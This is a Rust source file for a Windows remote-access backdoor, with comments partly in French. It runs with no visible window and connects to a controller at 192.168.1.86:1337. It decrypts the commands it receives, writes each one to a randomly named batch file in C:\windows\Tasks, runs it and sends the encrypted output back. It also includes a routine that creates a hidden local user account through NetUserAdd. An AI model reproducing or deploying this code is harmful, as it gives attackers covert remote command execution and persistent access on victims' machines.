#![windows_subsystem = "windows"]
use std::env;
use std::ffi::OsStr;
use std::io::{self, prelude::*};
use std::iter::once;
use std::net::TcpStream;
use std::os::windows::ffi::OsStrExt;
use std::process;
use std::thread;
use std::time::Duration;
use winapi::um::lmaccess::{NetUserAdd, UF_SCRIPT, USER_INFO_1};

use std::sync::{Arc, Mutex};

use magic_crypt::generic_array::typenum::U256;
use magic_crypt::{new_magic_crypt, MagicCryptTrait};
use short_crypt::ShortCrypt;

use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use std::fs::File;
use std::io::{Result, Write};
use std::process::Command;

fn connect_to() -> io::Result<()> {
    let ip_address = "192.168.1.86:1337";
    let mut stream = TcpStream::connect(&ip_address)?;
    let mut input = String::new();
    let mut code = String::new();
    //let code = Arc::new(Mutex::new(String::new()));
    let mut code_cpy = &code;
    let mut buffer = [0; 1024];
    let mut reader = io::stdin();
    let mut stream_clone = stream.try_clone().expect("");
    //let code_clone = Arc::clone(&code);
    thread::spawn(move || {
        let mut recv_buffer = [0; 1024];
        loop {
            match stream_clone.read(&mut recv_buffer) {
                Ok(n) if n > 0 => {
                    let uncrypted_buffer = uncrypt(recv_buffer[..n].to_vec());
                    println!("{}", String::from_utf8_lossy(&uncrypted_buffer).trim()); //                   stream.write_all("test".as_bytes()).expect("Failed to write

                    code = String::from_utf8_lossy(&uncrypted_buffer)
                        .trim()
                        .to_string();

                    let code_cpy = create_write_exec_remove(&code).expect("");
                    let mut b64 = input_to_b64(code_cpy.trim().to_string());
                    stream.write_all(b64.as_bytes());
                    //thread::sleep(Duration::from_secs_f64(4.5));
                    input.clear();

                    //let uncrypted_buffer = uncrypt(b64.as_bytes().to_vec());
                    //println!("{}", String::from_utf8_lossy(&uncrypted_buffer).trim());
                }
                _ => {
                    break;
                }
            }
        }
        //code_clone.lock().unwrap().clear();
        //code_clone.lock().unwrap().push_str(&uncrypted_buffer);
    });

    loop {
        //let code_lock = code.lock().unwrap();
        //code_cpy = code_lock.clone();
        //let mut b64 = input_to_b64(code_cpy.trim().to_string());
        //code_cpy = code;
    }
}

//fn input_to_b64(input: String) -> String {
//    let key: &str;
//    let mut input = base64::encode(input);
//    let args_vec: Vec<String> = env::args().collect();
//    if { args_vec.len() < 2 } {
//        key = "1234567890";
//    } else {
//        key = args_vec[1].clone();
//    }
//    let sc = ShortCrypt::new(&key);
//    input = sc.encrypt_to_url_component(&input);
//
//    let key = args_vec[1].clone();
//    let sc = ShortCrypt::new(&key);
//
//    let mut input = sc.encrypt_to_url_component(&input);
//    input = base64::encode(input);
//    //println!("{}", input);
//    input
//}
//

fn input_to_b64(input: String) -> String {
    let mut input = base64::encode(&input);

    let args_vec: Vec<String> = env::args().collect();
    let key = if args_vec.len() < 2 {
        "test".to_string()
    } else {
        args_vec[1].clone()
    };

    let sc = ShortCrypt::new(&key);
    input = sc.encrypt_to_url_component(&input);
    input = base64::encode(&input);

    input
}

//fn uncrypt(recv_buffer: Vec<u8>) -> Vec<u8> {
//    let key: String;
//    let args_vec: Vec<String> = env::args().collect();
//    if { args_vec.len() < 2 } {
//        key = "1234567890";
//    } else {
//        key = args_vec[1].clone();
//    } //let key = args_vec[1].clone();
//    let sc = ShortCrypt::new(&key);
//    let decrypted_buffer_str = String::from_utf8_lossy(&recv_buffer[..]);
//    let mut decrypted_buffer = sc.decrypt_url_component(&decrypted_buffer_str).expect("");
//    let mut decrypted_buffer_str = String::from_utf8_lossy(&decrypted_buffer[..])
//        .trim()
//        .to_string();
//    let mut decoded_buffer = base64::decode(&decrypted_buffer).expect("");
//    decoded_buffer
//}
fn uncrypt(recv_buffer: Vec<u8>) -> Vec<u8> {
    let args_vec: Vec<String> = env::args().collect();
    let key = if args_vec.len() < 2 {
        "1234567890".to_string()
    } else {
        args_vec[1].clone()
    };

    let sc = ShortCrypt::new(&key);
    let decrypted_buffer_str = String::from_utf8_lossy(&recv_buffer[..]);
    let decrypted_buffer = sc.decrypt_url_component(&decrypted_buffer_str).expect("");
    let decoded_buffer = base64::decode(&decrypted_buffer).expect("");

    decoded_buffer
}
pub fn winstr(value: &str) -> Vec<u16> {
    OsStr::new(value).encode_wide().chain(once(0)).collect()
}

fn create_user_1() {
    let mut username = winstr("Test");
    let mut password = winstr("Test******");
    let mut user = USER_INFO_1 {
        usri1_name: username.as_mut_ptr(),
        usri1_password: password.as_mut_ptr(),
        usri1_priv: 1,
        usri1_password_age: 0,
        usri1_home_dir: std::ptr::null_mut(),
        usri1_comment: std::ptr::null_mut(),
        usri1_flags: UF_SCRIPT,
        usri1_script_path: std::ptr::null_mut(),
    };

    let mut error = 0;
    unsafe {
        NetUserAdd(
            std::ptr::null_mut(),
            1,
            &mut user as *mut _ as _,
            &mut error,
        );
    }
} //marche pas

//##################################### Creation + execution du fichier ##########################################

fn create_file(code: &str) -> io::Result<String> {
    //   let random_filename: String = thread_rng().sample_iter(&Alphanumeric).take(9).collect();
    //   create a fully random filename
    let random_filename = thread_rng()
        .sample_iter(&Alphanumeric)
        .take(9)
        .map(char::from)
        .collect::<String>();
    let output_file_path = format!("C:\\windows\\TASKS\\{}.bat", random_filename);

    let mut file = File::create(&output_file_path)?;
    file.write_all("@echo off\n".as_bytes())?;
    file.write_all(code.as_bytes())?;

    Ok(output_file_path)
}

fn execute_bat_and_redirecte_output_to_another_file(file_path: &str) -> io::Result<String> {
    let random_filename = thread_rng()
        .sample_iter(&Alphanumeric)
        .take(8)
        .map(char::from)
        .collect::<String>();
    let out_file = format!("C:\\windows\\Tasks\\{}.txt", random_filename);

    let output_file_path = format!("C:\\windows\\Tasks\\{}.bat", out_file);
    let output = Command::new(file_path).output().expect("");
    let mut file = File::create(&out_file)?;
    file.write_all(&output.stdout)?;
    println!("stdout = {:?}", output.stdout);
    Ok(out_file)
}

fn read_file(file_path: String) -> io::Result<String> {
    let mut file = File::open(file_path)?;
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;
    Ok(contents)
}

fn remove_file(file_path: String) -> io::Result<()> {
    std::fs::remove_file(file_path)?;
    Ok(())
}

fn create_write_exec_remove(code: &str) -> io::Result<String> {
    let file_path = create_file(code)?;
    let out_file = execute_bat_and_redirecte_output_to_another_file(&file_path)?;
    //let out_file_cpy = out_file;
    let content = read_file(out_file)?;
    //remove_file(file_path)?;
    //remove_file(out_file)?;
    println!("content = {}", content);
    Ok(content)
}
fn main() {
    //let a_result = create_file("dir");

    //  println!("{:?}", a_result);

    //create_write_exec_remove("dir").expect("Failed to create file");

    //   match a_result {
    //       Ok(a) => {
    //           let b = execute_bat_and_redirecte_output_to_another_file(&a)
    //               .expect("Failed to execute bat and redirect output");
    //          println!("{:?}", b);
    //           println!("{:?}", read_file(b));
    //           remove_file(b).expect("Failed to remove file");
    //           remove_file(a).expect("Failed to remove file");
    //       }
    //       Err(err) => {
    //           println!("Error creating file: {}", err);
    //       }
    //   }

    // create_user_1();
    // connect_to();

    //create_user_1();
    connect_to();
}
